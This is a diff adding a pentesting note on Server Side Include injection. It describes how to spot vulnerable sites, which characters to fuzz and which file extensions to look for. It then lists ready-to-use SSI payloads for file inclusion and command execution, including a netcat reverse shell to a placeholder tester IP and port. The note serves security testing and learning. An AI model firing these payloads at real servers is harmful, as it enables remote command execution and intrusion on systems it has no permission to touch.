@@ -1,0 +1,50 @@
+Sever Side Include(SSI) Injection: 
+
+
+SSIs are directives on a web page that are used to feed an HTML page some dynamic content (sort of similar to CGIs). However, SSIs are used to execute some action before the page is loaded or while it is being rendered. Thus the SSI gets analyzed before the page is rendered for the user. 
+
+SSI injection can lead to a fairly wide array of vulnerabilities. We could inject scripts to achieve XSS, or depending on the server config, we could possibly be able to read protected files or even inject commands to the server (w/ same impact and OS command injection). 
+
+
+When can check if the application is properly validating input field data by inserting characters that are used in SSI directives, like:
+
+< ! # = / . " - > and [a-zA-Z0-9] 
+
+Another sign of a site being vulnerable is the presence of .stm, .shtm, .shtml files on the site. (use gf config called SSI-file-exts to quickly find these after crawling/ wayback). Even in the absence of these files, the website could surely still be vulnerable. 
+
+If successful, the result of our attack will be visible on the page the next time it is loaded in the browser. 
+
+
+Testing wise, its similar to XSS/SSTI just fuzz some params. Start with the 2 detection payloads, see what chars work and go from there. 
+
+The general form for an SSI directive is as follows: <!--#directive param="value" -->
+
+here are some good payloads that show this format: 
+
+// Document name
+<!--#echo var="DOCUMENT_NAME" -->
+// Date
+<!--#echo var="DATE_LOCAL" -->
+
+// File inclusion
+<!--#include virtual="/index.html" -->
+// Including files (same directory)
+<!--#include file="file_to_include.html" -->
+// CGI Program results
+<!--#include virtual="/cgi-bin/counter.pl" -->
+// Including virtual files (same directory)
+<!--#include virtual="file_to_include.html" -->
+// Modification date of a file
+<!--#flastmod file="index.html" -->
+
+// Command exec
+<!--#exec cmd="dir" -->
+// Command exec
+<!--#exec cmd="ls" -->
+// Reverse shell
+<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->
+
+// Print all variables
+<!--#printenv -->
+// Setting variables
+<!--#set var="name" value="Rich" -->
